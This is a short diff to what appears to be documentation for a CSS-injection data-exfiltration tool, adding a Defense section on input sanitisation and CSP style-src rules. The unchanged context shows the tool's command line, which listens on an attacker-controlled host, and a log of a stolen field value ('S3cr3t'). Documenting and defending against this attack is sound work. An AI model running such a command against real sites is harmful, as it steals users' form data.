@@ -65,6 +65,8 @@ $ ./css_exfil.py -l $myip:$myport -s 'input#name' -a value
 127.0.0.1 - - [23/Dec/2019 18:25:45] "GET /evil.css HTTP/1.1" 200 -
 S3cr3t
 ```
+## Defense
+Other than properly sanitizing user input to prevent HTML injection, the `style-src-elem` or the broader `style-src` (or `default-src`) CSP rules can be set to prevent loading CSS files from untrusted resources.
 ## Links
 [Stealing Data With CSS: Attack and Defense](https://www.mike-gualtieri.com/posts/stealing-data-with-css-attack-and-defense)
 
